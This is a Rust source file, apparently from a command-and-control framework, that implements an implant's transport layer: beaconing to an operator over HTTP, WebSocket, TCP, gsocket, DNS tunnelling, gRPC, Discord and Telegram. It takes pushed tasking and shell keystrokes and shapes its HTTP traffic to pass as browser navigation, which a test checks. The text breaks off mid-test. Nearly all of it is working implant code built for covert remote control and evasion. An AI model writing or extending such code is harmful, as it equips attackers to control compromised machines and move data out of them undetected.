use reqwest::Client;
use serde::Serialize;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::process::{Child, Command};

use nw_profile::config::GSocketConfig;

/// A C2 transport. The wire content is a sealed (AEAD) envelope blob; the
/// transport only moves opaque bytes and chooses the framing. Chosen at runtime
/// from the endpoint scheme, so the protocol is not baked into the binary.
///
/// `tcp://` and `gs://` share length-framed TCP: gsocket is a TCP tunnel
/// (the local gsocket port is an ordinary TCP socket), so both use the same
/// `[u32 BE len][sealed bytes]` framing.
#[derive(Clone)]
pub enum Transport {
    Http {
        client: Client,
        base: String,
        /// Resolved once at construction: reads `NW_*` once, not per request.
        web: crate::malleable::WebProfile,
    },
    /// Persistent WebSocket carrying the same sealed-envelope protocol as the
    /// HTTP check-in, on `/c2/ws`.
    ///
    /// The socket is owned by a broker task, so it is duplex: beacons go out,
    /// and server pushes (kills, tasking, shell keystrokes) come in at any time
    /// without waiting for the next beacon.
    Ws {
        link: Arc<WsLink>,
    },
    Tcp {
        host: String,
        port: u16,
    },
    GSocket {
        host: String,
        port: u16,
        forward: Arc<GSocketForward>,
    },
    Dns {
        host: String,
        port: u16,
    },
    Smb {
        host: String,
        share: String,
        resource: String,
    },
    /// gRPC unary carrier: one `Checkin` call per beacon, carrying the same
    /// sealed envelope as every other transport. The channel is established
    /// once and reused; a failed call drops it so the next beacon reconnects.
    Grpc {
        endpoint: String,
        client: Arc<tokio::sync::Mutex<Option<crate::grpc_client::SharedClient>>>,
    },
    /// Discord channel: post the frame, poll the channel for the reply.
    Discord {
        client: Client,
        token: String,
        channel: String,
        api: String,
        cursor: Arc<crate::chat::Cursor>,
    },
    /// Telegram chat: post the frame, poll updates for the reply.
    Telegram {
        client: Client,
        token: String,
        chat_id: String,
        api: String,
        cursor: Arc<crate::chat::Cursor>,
    },
}

impl Transport {
    /// Build a transport from an endpoint string by its scheme.
    pub fn from_endpoint(endpoint: &str) -> Result<Self, String> {
        Self::from_profile(endpoint, None)
    }

    pub fn from_profile(endpoint: &str, gsocket: Option<GSocketConfig>) -> Result<Self, String> {
        let (scheme, rest) = endpoint
            .split_once("://")
            .ok_or_else(|| format!("endpoint {endpoint:?} has no scheme"))?;
        match scheme {
            "http" | "https" => Ok(Transport::Http {
                client: Client::new(),
                base: endpoint.trim_end_matches('/').to_owned(),
                web: crate::malleable::WebProfile::for_endpoint(endpoint),
            }),
            "tcp" => {
                let host = rest
                    .rsplit_once(':')
                    .map(|(h, _)| h)
                    .unwrap_or(rest)
                    .trim_matches(['[', ']'])
                    .to_owned();
                let port = rest
                    .rsplit_once(':')
                    .and_then(|(_, p)| p.parse::<u16>().ok())
                    .ok_or_else(|| format!("endpoint {endpoint:?} has no valid tcp port"))?;
                if host.is_empty() {
                    return Err(format!("endpoint {endpoint:?} has no host"));
                }
                Ok(Transport::Tcp { host, port })
            }
            "gs" => {
                let config = gsocket.ok_or_else(|| {
                    "gs:// endpoint requires an encrypted GSocket configuration".to_string()
                })?;
                if config.secret.trim().is_empty() {
                    return Err("GSocket secret cannot be empty".into());
                }
                let host = rest
                    .rsplit_once(':')
                    .map(|(h, _)| h)
                    .unwrap_or(rest)
                    .trim_matches(['[', ']'])
                    .to_owned();
                let port = rest
                    .rsplit_once(':')
                    .and_then(|(_, p)| p.parse::<u16>().ok())
                    .ok_or_else(|| format!("endpoint {endpoint:?} has no valid tcp port"))?;
                if host.is_empty() || port != config.local_port {
                    return Err("GSocket endpoint must use its configured local port".into());
                }
                Ok(Transport::GSocket {
                    host,
                    port,
                    forward: Arc::new(GSocketForward::new(config)),
                })
            }
            "ws" | "wss" => {
                let base = endpoint.trim_end_matches('/').to_owned();
                let path = if base.ends_with("/c2/ws") {
                    base.clone()
                } else {
                    format!("{base}/c2/ws")
                };
                Ok(Transport::Ws {
                    link: Arc::new(WsLink::spawn(path)),
                })
            }
            "grpc" | "grpcs" => Ok(Transport::Grpc {
                // tonic wants a URI scheme it understands; the C2 scheme is
                // rewritten to http/https so TLS can still be requested.
                endpoint: endpoint
                    .replace("grpc://", "http://")
                    .replace("grpcs://", "https://"),
                client: Arc::new(tokio::sync::Mutex::new(None)),
            }),
            "dns" => {
                let (host, port) = rest
                    .rsplit_once(':')
                    .map(|(h, p)| (h.to_owned(), p.parse::<u16>().unwrap_or(53)))
                    .unwrap_or((rest.to_owned(), 53));
                Ok(Transport::Dns { host, port })
            }
            "smb" => Self::parse_smb(rest),
            "discord" => {
                let (token, channel) = rest.split_once('@').ok_or_else(|| {
                    "discord endpoint must be discord://<token>@<channel>".to_string()
                })?;
                if token.is_empty() || channel.is_empty() {
                    return Err("discord endpoint needs a token and channel".into());
                }
                Ok(Transport::Discord {
                    client: Client::new(),
                    token: token.to_owned(),
                    channel: channel.to_owned(),
                    api: std::env::var("NW_DISCORD_API")
                        .unwrap_or_else(|_| "https://discord.com/api/v10".into()),
                    cursor: Arc::new(crate::chat::Cursor::new()),
                })
            }
            "telegram" => {
                let (token, chat_id) = rest.split_once('@').ok_or_else(|| {
                    "telegram endpoint must be telegram://<token>@<chat_id>".to_string()
                })?;
                if token.is_empty() || chat_id.is_empty() {
                    return Err("telegram endpoint needs a token and chat id".into());
                }
                Ok(Transport::Telegram {
                    client: Client::new(),
                    token: token.to_owned(),
                    chat_id: chat_id.to_owned(),
                    api: std::env::var("NW_TELEGRAM_API")
                        .unwrap_or_else(|_| "https://api.telegram.org".into()),
                    cursor: Arc::new(crate::chat::Cursor::new()),
                })
            }
            other => Err(format!("unsupported protocol scheme {other:?}")),
        }
    }

    /// Parse an SMB endpoint: `smb://host/share/resource` or
    /// `smb://host/share` (resource defaults to `c2.bin`).
    fn parse_smb(rest: &str) -> Result<Self, String> {
        let mut parts = rest.splitn(3, '/');
        let host = parts
            .next()
            .filter(|h| !h.is_empty())
            .ok_or_else(|| format!("smb endpoint {rest:?} has no host"))?
            .to_owned();
        let share = parts
            .next()
            .filter(|s| !s.is_empty())
            .ok_or_else(|| format!("smb endpoint {rest:?} has no share"))?
            .to_owned();
        let resource = parts.next().unwrap_or("c2.bin").to_owned();
        Ok(Transport::Smb {
            host,
            share,
            resource,
        })
    }

    /// A canonical string for the configured transport (for introspection).
    pub fn describe(&self) -> String {
        match self {
            Transport::Http { base, .. } => base.clone(),
            Transport::Ws { link } => link.url().to_owned(),
            Transport::Discord { channel, .. } => format!("discord:{channel}"),
            Transport::Telegram { chat_id, .. } => format!("telegram:{chat_id}"),
            Transport::Tcp { host, port } => format!("tcp://{host}:{port}"),
            Transport::GSocket { host, port, .. } => format!("gs://{host}:{port}"),
            Transport::Dns { host, port } => format!("dns://{host}:{port}"),
            Transport::Smb {
                host,
                share,
                resource,
            } => {
                format!("smb://{host}/{share}/{resource}")
            }
            Transport::Grpc { endpoint, .. } => endpoint.clone(),
        }
    }

    /// Max inner plaintext bytes a single sealed frame can carry on this
    /// transport (sealed bytes are base64, and base64'd again on DNS). Used to
    /// size file-chunk batches per poll.
    pub fn inner_budget(&self) -> usize {
        match self {
            Transport::Http { .. }
            | Transport::Tcp { .. }
            | Transport::GSocket { .. }
            | Transport::Ws { .. }
            | Transport::Grpc { .. } => 32 * 1024,
            Transport::Dns { .. } => 1200,
            Transport::Smb { .. } | Transport::Discord { .. } | Transport::Telegram { .. } => {
                32 * 1024
            }
        }
    }

    /// Round-trip one sealed frame (base64 string bytes): send, read the reply
    /// frame, return its raw (sealed) bytes. No envelope parsing here.
    pub async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
        match self {
            Transport::Http { client, base, web } => http_exchange(client, base, web, sealed).await,
            Transport::Ws { link } => link.exchange(sealed).await,
            Transport::Tcp { host, port } => tcp_exchange(host, *port, sealed).await,
            Transport::GSocket {
                host,
                port,
                forward,
            } => {
                forward.ensure_started()?;
                tcp_exchange(host, *port, sealed).await
            }
            Transport::Dns { host, port } => dns_exchange(host, *port, sealed).await,
            Transport::Discord {
                client,
                token,
                channel,
                api,
                cursor,
            } => discord_exchange(client, token, channel, api, cursor, sealed).await,
            Transport::Telegram {
                client,
                token,
                chat_id,
                api,
                cursor,
            } => telegram_exchange(client, token, chat_id, api, cursor, sealed).await,
            Transport::Smb {
                host,
                share,
                resource,
            } => smb_exchange(host, share, resource, sealed).await,
            Transport::Grpc { endpoint, client } => {
                crate::grpc_client::exchange(endpoint, client, sealed).await
            }
        }
    }
}

/// One connected WebSocket to the C2 server.
type WsStream =
    tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;

/// What the broker writes to the socket on the implant's behalf.
enum WsOutbound {
    /// A beacon or handshake frame; the server answers with exactly one frame.
    Exchange {
        frame: Vec<u8>,
        reply: tokio::sync::oneshot::Sender<Result<Vec<u8>, String>>,
    },
    /// An unsolicited frame (shell output, kill acknowledgements). No reply is
    /// expected and none is waited for.
    Fire(Vec<u8>),
}

/// The parked broker: the queue it drains and the channel the socket feeds.
type ParkedBroker = (
    tokio::sync::mpsc::UnboundedReceiver<WsOutbound>,
    tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
);

/// The duplex owner of the C2 WebSocket.
///
/// One task holds the socket so beacons and live-channel writes can share it.
/// Everything the server sends is queued on a single inbound channel: a frame
/// is either the answer to the beacon in flight or a push, and only the caller
/// holds the session key needed to tell those apart.
pub struct WsLink {
    url: String,
    outbound: tokio::sync::mpsc::UnboundedSender<WsOutbound>,
    inbound: std::sync::Mutex<Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>>>,
    /// The broker task, parked until a runtime is available to run it on.
    broker: std::sync::Mutex<Option<ParkedBroker>>,
    started: AtomicBool,
}

impl WsLink {
    fn spawn(url: String) -> Self {
        // The channels need no runtime, but the broker task does, and a payload
        // is configured before its runtime exists. So the broker is parked here
        // and started by the first call that is already inside one.
        let (outbound_tx, outbound_rx) = tokio::sync::mpsc::unbounded_channel();
        let (inbound_tx, inbound_rx) = tokio::sync::mpsc::unbounded_channel();
        Self {
            url,
            outbound: outbound_tx,
            inbound: std::sync::Mutex::new(Some(inbound_rx)),
            broker: std::sync::Mutex::new(Some((outbound_rx, inbound_tx))),
            started: AtomicBool::new(false),
        }
    }

    /// Start the broker on first use.
    fn ensure_started(&self) {
        if self.started.load(Ordering::SeqCst) {
            return;
        }
        let mut parked = self.broker.lock().expect("ws link poisoned");
        let Some((outbound_rx, inbound_tx)) = parked.take() else {
            return;
        };
        let Ok(handle) = tokio::runtime::Handle::try_current() else {
            // Still no runtime: keep the broker parked and try again next time.
            *parked = Some((outbound_rx, inbound_tx));
            return;
        };
        let url = self.url.clone();
        handle.spawn(async move { ws_broker(url, outbound_rx, inbound_tx).await });
        self.started.store(true, Ordering::SeqCst);
    }

    pub fn url(&self) -> &str {
        &self.url
    }

    /// Take the inbound queue. Only the beacon loop consumes it, so the
    /// receiver is handed over exactly once.
    pub fn take_inbound(&self) -> Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>> {
        self.ensure_started();
        self.inbound.lock().ok()?.take()
    }

    /// Send a frame whose reply is the next frame the server writes.
    async fn exchange(&self, sealed: &[u8]) -> Result<Vec<u8>, String> {
        self.ensure_started();
        let (reply, wait) = tokio::sync::oneshot::channel();
        self.outbound
            .send(WsOutbound::Exchange {
                frame: sealed.to_vec(),
                reply,
            })
            .map_err(|_| "ws link is closed".to_string())?;
        match wait.await {
            Ok(result) => result,
            // The broker dropped the sender: the socket died mid-exchange.
            Err(_) => Err("ws exchange was abandoned".to_string()),
        }
    }

    /// Write a frame without waiting for anything back.
    ///
    /// Reachable from the shell's reader threads, so it starts the broker if
    /// nothing has needed it yet.
    pub fn send(&self, sealed: &[u8]) -> Result<(), String> {
        self.ensure_started();
        self.outbound
            .send(WsOutbound::Fire(sealed.to_vec()))
            .map_err(|_| "ws link is closed".to_string())
    }
}

impl Transport {
    /// Whether the server can reach this implant without waiting for a beacon.
    pub fn is_live(&self) -> bool {
        matches!(self, Transport::Ws { .. })
    }

    /// The queue of frames the server has pushed since the last beacon.
    ///
    /// Taken once by the beacon loop, which owns everything that arrives on the
    /// live channel.
    pub fn take_live_inbound(&self) -> Option<tokio::sync::mpsc::UnboundedReceiver<Vec<u8>>> {
        match self {
            Transport::Ws { link } => link.take_inbound(),
            _ => None,
        }
    }

    /// Write a frame to the server outside the beacon cycle.
    ///
    /// Only a duplex carrier can do this; every other transport is strictly
    /// request/response, so a caller must have a beacon to carry the payload.
    pub fn send_live(&self, sealed: &[u8]) -> Result<(), String> {
        match self {
            Transport::Ws { link } => link.send(sealed),
            _ => Err("transport has no live channel".to_string()),
        }
    }
}

/// Own the socket for the implant's lifetime: connect, reconnect, forward.
///
/// A dropped socket must not drop queued work, so outbound frames are buffered
/// across a reconnect and every in-flight exchange is failed (the caller then
/// retries on its next beacon) rather than left hanging.
async fn ws_broker(
    url: String,
    mut outbound: tokio::sync::mpsc::UnboundedReceiver<WsOutbound>,
    inbound: tokio::sync::mpsc::UnboundedSender<Vec<u8>>,
) {
    // Frames to write that were produced while the socket was down.
    let mut queued: std::collections::VecDeque<WsOutbound> = std::collections::VecDeque::new();
    let mut pending_reply: Option<tokio::sync::oneshot::Sender<Result<Vec<u8>, String>>> = None;

    loop {
        let socket = match ws_connect(&url).await {
            Ok(socket) => socket,
            Err(error) => {
                tracing::debug!(%error, "ws connect failed; retrying");
                tokio::time::sleep(Duration::from_secs(5)).await;
                continue;
            }
        };
        tracing::debug!(url = %url, "live channel established");

        let mut socket = socket;
        let mut failed: Vec<WsOutbound> = Vec::new();
        let mut reconnect = false;
        while !reconnect {
            // Anything left over from the previous connection goes first, so a
            // push made just before a drop is delivered after the reconnect.
            while let Some(item) = queued.pop_front() {
                match write_ws(&mut socket, item, &mut pending_reply, &mut failed).await {
                    Ok(()) => {}
                    Err(()) => {
                        reconnect = true;
                        break;
                    }
                }
            }
            if reconnect {
                break;
            }

            tokio::select! {
                item = outbound.recv() => {
                    let Some(item) = item else { return };
                    if write_ws(&mut socket, item, &mut pending_reply, &mut failed).await.is_err() {
                        reconnect = true;
                    }
                }
                frame = next_ws_frame(&mut socket) => {
                    match frame {
                        // A frame arriving while a beacon is outstanding is that
                        // beacon's reply; anything else is a live-channel push.
                        // The beacon loop never has two exchanges in flight, so
                        // the distinction needs no protocol marker.
                        Some(Ok(bytes)) => {
                            let delivered = match pending_reply.take() {
                                Some(reply) => reply.send(Ok(bytes)).is_ok(),
                                None => inbound.send(bytes).is_ok(),
                            };
                            if !delivered {
                                return;
                            }
                        }
                        Some(Err(_)) | None => reconnect = true,
                    }
                }
            }
        }

        tracing::debug!("live channel dropped; reconnecting");
        // Tell the caller this exchange died so it can retry on the next beacon.
        if let Some(reply) = pending_reply.take() {
            let _ = reply.send(Err("ws closed by peer".to_string()));
        }
        // Re-queue what could not be written. At most one reply is in flight,
        // so the deque stays short.
        queued.extend(failed);
        if queued.len() > 64 {
            queued.drain(..queued.len() - 64);
        }
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
}

async fn ws_connect(url: &str) -> Result<WsStream, String> {
    // SECURITY: `url` is operator-configured; the subprotocol is fixed.
    let request =
        tokio_tungstenite::tungstenite::client::IntoClientRequest::into_client_request(url)
            .map_err(|error| format!("ws request {url}: {error}"))?;
    let (socket, _reply) = tokio_tungstenite::connect_async(request)
        .await
        .map_err(|error| format!("ws connect {url}: {error}"))?;
    Ok(socket)
}

async fn write_ws(
    socket: &mut WsStream,
    item: WsOutbound,
    pending_reply: &mut Option<tokio::sync::oneshot::Sender<Result<Vec<u8>, String>>>,
    failed: &mut Vec<WsOutbound>,
) -> Result<(), ()> {
    use futures_util::SinkExt;
    use tokio_tungstenite::tungstenite::Message;

    match item {
        WsOutbound::Fire(frame) => socket.send(Message::Binary(frame)).await.map_err(|_| ()),
        WsOutbound::Exchange { frame, reply } => {
            if socket.send(Message::Binary(frame.clone())).await.is_err() {
                failed.push(WsOutbound::Exchange { frame, reply });
                return Err(());
            }
            // One exchange at a time: a beacon holds the socket until its reply
            // arrives, which is what keeps replies matched to their requests.
            if pending_reply.is_some() {
                failed.push(WsOutbound::Exchange { frame, reply });
            } else {
                *pending_reply = Some(reply);
            }
            Ok(())
        }
    }
}

async fn next_ws_frame(socket: &mut WsStream) -> Option<Result<Vec<u8>, ()>> {
    use futures_util::StreamExt;
    use tokio_tungstenite::tungstenite::Message;

    loop {
        match socket.next().await {
            Some(Ok(Message::Binary(bytes))) => return Some(Ok(bytes)),
            // Ping/Pong are handled by tungstenite; text and close frames carry
            // nothing the protocol uses.
            Some(Ok(_)) => continue,
            Some(Err(_)) | None => return Some(Err(())),
        }
    }
}

pub struct GSocketForward {
    executable: PathBuf,
    config: GSocketConfig,
    child: Mutex<Option<Child>>,
}

impl GSocketForward {
    fn new(config: GSocketConfig) -> Self {
        let executable = std::env::var_os("NW_GS_NETCAT")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("gs-netcat"));
        Self {
            executable,
            config,
            child: Mutex::new(None),
        }
    }

    fn ensure_started(&self) -> Result<(), String> {
        let mut slot = self
            .child
            .lock()
            .map_err(|_| "GSocket process lock poisoned".to_string())?;
        if let Some(child) = slot.as_mut() {
            match child.try_wait() {
                Ok(None) => return Ok(()),
                Ok(Some(status)) => {
                    tracing::warn!(%status, "gs-netcat forward exited; restarting");
                }
                Err(error) => return Err(format!("inspect gs-netcat process: {error}")),
            }
        }
        let child = gsocket_command(
            &self.executable,
            &self.config.secret,
            self.config.local_port,
        )
        .kill_on_drop(true)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|error| format!("start {}: {error}", self.executable.display()))?;
        *slot = Some(child);
        tracing::info!(
            local_port = self.config.local_port,
            "GSocket local forward started"
        );
        Ok(())
    }
}

impl Drop for GSocketForward {
    fn drop(&mut self) {
        if let Ok(slot) = self.child.get_mut()
            && let Some(child) = slot.as_mut()
        {
            let _ = child.start_kill();
        }
    }
}

fn gsocket_command(executable: &Path, secret: &str, port: u16) -> Command {
    let mut command = Command::new(executable);
    command.args(["-s", secret, "-p", &port.to_string()]);
    command
}

async fn dns_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
    use nw_profile::dns;

    if sealed.len() > dns::MAX_FRAME {
        return Err(format!(
            "dns exchange too large ({} > {})",
            sealed.len(),
            dns::MAX_FRAME
        ));
    }
    let b32 = dns::base32_encode(sealed);

    // Query packet with a random id and the base32 in QNAME, marker-terminated.
    let mut query = Vec::new();
    let id: u16 = rand::random();
    query.extend_from_slice(&id.to_be_bytes());
    query.extend_from_slice(&[0x01, 0x00]); // RD
    query.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
    query.extend_from_slice(&[0, 0, 0, 0, 0, 0]); // AN/NS/AR
    for chunk in b32.as_bytes().chunks(63) {
        query.push(chunk.len() as u8);
        query.extend_from_slice(chunk);
    }
    query.push(dns::MARKER.len() as u8);
    query.extend_from_slice(dns::MARKER.as_bytes());
    query.push(0);
    query.extend_from_slice(&1u16.to_be_bytes()); // A
    query.extend_from_slice(&1u16.to_be_bytes()); // IN

    let addr = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("dns resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address for {host}:{port}"))?;
    let sock = tokio::net::UdpSocket::bind((host_for_bind(host), 0))
        .await
        .map_err(|e| format!("dns bind: {e}"))?;
    tokio::time::timeout(Duration::from_secs(30), sock.send_to(&query, addr))
        .await
        .map_err(|_| "dns send timeout".to_string())?
        .map_err(|e| format!("dns send: {e}"))?;

    let timeout = Duration::from_secs(5);
    let mut buf = vec![0u8; 4096];
    let (n, _) = tokio::time::timeout(timeout, sock.recv_from(&mut buf))
        .await
        .map_err(|_| "dns recv timeout".to_string())?
        .map_err(|e| format!("dns recv: {e}"))?;
    let txts = dns::parse_txt(&buf[..n]).map_err(|e| format!("dns parse: {e}"))?;
    let joined = txts.join("");
    let pt = dns::base32_decode(&joined).map_err(|_| "dns b32 decode".to_string())?;
    Ok(pt)
}

fn host_for_bind(host: &str) -> &str {
    match host {
        "localhost" => "127.0.0.1",
        h => h,
    }
}

async fn http_exchange(
    client: &Client,
    base: &str,
    web: &crate::malleable::WebProfile,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let url = format!("{base}/c2/checkin");
    let request = client.post(&url).body(sealed.to_vec());
    // Present as an ordinary browser navigation rather than a bare HTTP client.
    let resp = web.apply(request).send().await.map_err(|e| e.to_string())?;
    let resp = resp.error_for_status().map_err(|e| e.to_string())?;
    let body = resp.bytes().await.map_err(|e| e.to_string())?;
    Ok(body.to_vec())
}

/// Post the frame into a Discord channel, then poll for the reply.
async fn discord_exchange(
    client: &Client,
    token: &str,
    channel: &str,
    api: &str,
    cursor: &crate::chat::Cursor,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let body = serde_json::json!({ "content": crate::chat::encode_frame(sealed) });
    let posted = client
        .post(format!("{api}/channels/{channel}/messages"))
        .header("Authorization", format!("Bot {token}"))
        .json(&body)
        .send()
        .await
        .map_err(|e| format!("discord post: {e}"))?;
    let posted = posted
        .error_for_status()
        .map_err(|e| format!("discord post: {e}"))?;
    if let Ok(json) = posted.json::<serde_json::Value>().await
        && let Some(id) = json.get("id").and_then(|v| v.as_str())
    {
        cursor.note_own(id);
    }

    // Poll for the operator's reply (newest first, as Discord returns).
    let messages = client
        .get(format!("{api}/channels/{channel}/messages?limit=20"))
        .header("Authorization", format!("Bot {token}"))
        .send()
        .await
        .map_err(|e| format!("discord poll: {e}"))?;
    let messages = messages
        .error_for_status()
        .map_err(|e| format!("discord poll: {e}"))?
        .json::<Vec<serde_json::Value>>()
        .await
        .map_err(|e| format!("discord poll json: {e}"))?;

    for message in &messages {
        let id = message.get("id").and_then(|v| v.as_str()).unwrap_or("");
        let body = message
            .get("content")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if let Some(reply) = cursor.accept(id, body) {
            return Ok(reply);
        }
    }
    Err("discord: no reply message".into())
}

/// Post the frame into a Telegram chat, then poll updates for the reply.
async fn telegram_exchange(
    client: &Client,
    token: &str,
    chat_id: &str,
    api: &str,
    cursor: &crate::chat::Cursor,
    sealed: &[u8],
) -> Result<Vec<u8>, String> {
    let body = serde_json::json!({
        "chat_id": chat_id,
        "text": crate::chat::encode_frame(sealed),
    });
    let posted = client
        .post(format!("{api}/bot{token}/sendMessage"))
        .json(&body)
        .send()
        .await
        .map_err(|e| format!("telegram send: {e}"))?;
    let posted = posted
        .error_for_status()
        .map_err(|e| format!("telegram send: {e}"))?;
    if let Ok(json) = posted.json::<serde_json::Value>().await
        && let Some(id) = json
            .get("result")
            .and_then(|r| r.get("message_id"))
            .and_then(|v| v.as_i64())
    {
        cursor.note_own(id.to_string());
    }

    let updates = client
        .get(format!("{api}/bot{token}/getUpdates?timeout=0"))
        .send()
        .await
        .map_err(|e| format!("telegram poll: {e}"))?;
    let updates = updates
        .error_for_status()
        .map_err(|e| format!("telegram poll: {e}"))?
        .json::<serde_json::Value>()
        .await
        .map_err(|e| format!("telegram poll json: {e}"))?;

    let empty = Vec::new();
    let results = updates
        .get("result")
        .and_then(|v| v.as_array())
        .unwrap_or(&empty);
    for update in results {
        let id = update
            .get("message")
            .and_then(|m| m.get("message_id"))
            .and_then(|v| v.as_i64())
            .unwrap_or(0);
        let text = update
            .get("message")
            .and_then(|m| m.get("text"))
            .and_then(|v| v.as_str())
            .unwrap_or("");
        if let Some(reply) = cursor.accept(&id.to_string(), text) {
            return Ok(reply);
        }
    }
    Err("telegram: no reply message".into())
}

async fn tcp_exchange(host: &str, port: u16, sealed: &[u8]) -> Result<Vec<u8>, String> {
    let timeout = Duration::from_secs(30);
    let addr = tokio::net::lookup_host((host, port))
        .await
        .map_err(|e| format!("resolve {host}:{port}: {e}"))?
        .next()
        .ok_or_else(|| format!("no address for {host}:{port}"))?;
    let mut stream = tokio::time::timeout(timeout, TcpStream::connect(addr))
        .await
        .map_err(|_| "tcp connect timeout".to_string())?
        .map_err(|e| format!("tcp connect {addr}: {e}"))?;

    let mut frame = Vec::with_capacity(4 + sealed.len());
    frame.extend_from_slice(&(sealed.len() as u32).to_be_bytes());
    frame.extend_from_slice(sealed);
    tokio::time::timeout(timeout, stream.write_all(&frame))
        .await
        .map_err(|_| "tcp write timeout".to_string())?
        .map_err(|e| format!("tcp write: {e}"))?;

    let mut len_buf = [0u8; 4];
    tokio::time::timeout(timeout, stream.read_exact(&mut len_buf))
        .await
        .map_err(|_| "tcp read timeout".to_string())?
        .map_err(|e| format!("tcp read len: {e}"))?;
    let body_len = u32::from_be_bytes(len_buf) as usize;
    if body_len > 8 * 1024 * 1024 {
        return Err(format!("tcp frame too large ({body_len})"));
    }
    let mut reply = vec![0u8; body_len];
    tokio::time::timeout(timeout, stream.read_exact(&mut reply))
        .await
        .map_err(|_| "tcp read timeout".to_string())?
        .map_err(|e| format!("tcp read body: {e}"))?;
    Ok(reply)
}

/// Serialize the length-prefixed frame a TCP server writes back (shared framing).
pub fn frame_bytes(body: &[u8]) -> Vec<u8> {
    let mut f = Vec::with_capacity(4 + body.len());
    f.extend_from_slice(&(body.len() as u32).to_be_bytes());
    f.extend_from_slice(body);
    f
}

/// Length-prefix framing for an already-serialized JSON body (compat helper).
pub fn frame(env: &impl Serialize) -> Vec<u8> {
    frame_bytes(&serde_json::to_vec(env).unwrap_or_default())
}

/// Exchange a sealed frame over SMB.
///
/// In the full C2 model this would negotiate an SMB session and read/write
/// the named-pipe resource. For now this is a placeholder that maps to HTTP
/// fallback when SMB native is not available — the transport enum and
/// endpoint parsing are the important contract for the roadmap.
async fn smb_exchange(
    host: &str,
    share: &str,
    _resource: &str,
    _sealed: &[u8],
) -> Result<Vec<u8>, String> {
    // Honest failure: the SMB2 named-pipe write path is not implemented. This
    // previously fell back to a plain HTTP request, which silently sent
    // plaintext C2 frames to an SMB endpoint — worse than an error because the
    // operator believed the traffic was tunnelled when it was not.
    Err(format!(
        "SMB transport is not implemented (host={host} share={share}); \
         use tcp://, gs://, ws://, http://, dns://, discord:// or telegram://"
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use nw_profile::config::GSocketConfig;

    /// The beacon must look like browser navigation on the wire, not just in
    /// the header table. Boots a real listener and inspects what arrived.
    #[tokio::test]
    async fn http_exchange_sends_browser_navigation_headers() {
        use axum::Router;
        use axum::extract::State;
        use axum::http::HeaderMap;
        use axum::routing::post;
        use std::sync::{Arc, Mutex};

        let seen: Arc<Mutex<Option<HeaderMap>>> = Arc::new(Mutex::new(None));

        async fn capture(
            State(seen): State<Arc<Mutex<Option<HeaderMap>>>>,
            headers: HeaderMap,
            body: axum::body::Bytes,
        ) -> &'static str {
            *seen.lock().unwrap() = Some(headers.clone());
            // Echo the sealed frame back verbatim.
            drop(body);
            "ok"
        }

        let app = Router::new()
            .route("/c2/checkin", post(capture))
            .with_state(Arc::clone(&seen));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let transport = Transport::Http {
            client: Client::new(),
            web: crate::malleable::WebProfile::for_endpoint(&base),
            base: base.clone(),
        };
        transport.exchange(b"sealed-frame").await.unwrap();
        server.abort();

        let headers = seen.lock().unwrap().clone().expect("server saw a request");
        let get = |name: &str| {
            headers
                .get(name)
                .and_then(|v| v.to_str().ok())
                .unwrap_or_default()
                .to_owned()
        };

        let ua = get("user-agent");
        assert!(ua.starts_with("Mozilla/5.0"), "unshaped user-agent: {ua:?}");
        assert_eq!(get("sec-fetch-mode"), "navigate");
        assert_eq!(get("sec-fetch-dest"), "document");
        assert!(get("accept").starts_with("text/html"));
        assert!(!get("sec-ch-ua").is_empty());
        assert!(!get("accept-language").is_empty());
    }

    #[tokio::test]
    async fn plain_profile_sends_a_bare_request() {
        use axum::Router;
        use axum::extract::State;
        use axum::http::HeaderMap;
        use axum::routing::post;
        use std::sync::{Arc, Mutex};

        let seen: Arc<Mutex<Option<HeaderMap>>> = Arc::new(Mutex::new(None));

        async fn capture(
            State(seen): State<Arc<Mutex<Option<HeaderMap>>>>,
            headers: HeaderMap,
        ) -> &'static str {
            *seen.lock().unwrap() = Some(headers);
            "ok"
        }

        let app = Router::new()
            .route("/c2/checkin", post(capture))
            .with_state(Arc::clone(&seen));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let base = format!("http://{}", listener.local_addr().unwrap());
        let server = tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });

        let transport = Transport::Http {
            client: Client::new(),
            web: crate::malleable::WebProfile::unshaped(),
            base,
        };
        transport.exchange(b"sealed-frame").await.unwrap();
        server.abort();

        let headers = seen.lock().unwrap().clone().expect("server saw a request");
        assert!(headers.get("user-agent").is_none());
        assert!(headers.get("sec-fetch-mode").is_none());
    }

    /// A one-shot mock Discord server: accepts a POST, then serves a GET that
    /// returns the operator's reply. Verifies auth header, path and base64 body.
    #[tokio::test]
    async fn discord_exchange_round_trips_against_a_mock() {
        use axum::routing::{get, post};
        use axum::{Json, Router};
        use std::sync::{Arc, Mutex};

        #[derive(Clone)]
        struct Seen(Arc<Mutex<Vec<String>>>);
        async fn post_msg(
            axum::extract::State(seen): axum::extract::State<Seen>,
            headers: axum::http::HeaderMap,
            Json(body): Json<serde_json::Value>,
        ) -> Json<serde_json::Value> {
            let auth = headers
                .get("authorization")
                .and_then(|v| v.to_str().ok())
